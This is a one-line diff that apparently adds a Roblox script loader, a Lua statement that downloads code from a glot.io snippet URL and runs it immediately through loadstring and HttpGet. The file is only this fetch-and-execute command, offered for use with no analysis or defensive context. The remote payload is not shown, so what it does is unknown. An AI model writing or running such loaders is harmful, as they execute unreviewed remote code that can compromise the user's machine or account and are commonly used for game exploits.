@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://glot.io/snippets/gp5pu59o7f/raw"))()
